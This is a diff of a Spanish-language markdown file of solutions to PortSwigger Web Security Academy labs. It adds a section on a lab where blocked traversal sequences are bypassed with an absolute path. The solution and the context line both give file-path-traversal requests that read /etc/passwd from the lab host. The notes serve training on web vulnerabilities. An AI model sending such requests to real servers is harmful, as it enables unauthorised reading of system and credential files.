@@ -91,6 +91,12 @@
 
 Hacer una request a https://LABID.web-security-academy.net/image?filename=../../../etc/passwd
 
+### [File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)
+
+#### Solución:
+
+Hacer una request a https://LABID.web-security-academy.net/image?filename=/etc/passwd
+
 ---
 
 ## [Access control vulnerabilities](https://portswigger.net/web-security/access-control)
